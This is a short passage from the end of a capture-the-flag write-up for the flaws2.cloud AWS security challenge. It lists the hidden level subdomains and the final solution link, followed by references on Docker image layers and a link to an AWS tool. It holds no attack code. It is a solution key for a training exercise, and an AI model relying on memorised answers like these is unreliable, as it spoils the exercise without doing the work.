2018-11-21 01:41:16 level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud
2018-11-26 19:47:22 level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud
2018-11-27 20:37:27 the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud

The final link is: http://the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud

## References

* [Install Docket Toolbox](https://docs.docker.com/toolbox/toolbox_install_mac/)
* [Digging into Docker](Digging%20into%20Docker%20layers)
* [Explaining Docker Image IDs](https://windsock.io/explaining-docker-image-ids/)

## Tools
* [Trailblazer](https://github.com/willbengtson/trailblazer-aws)
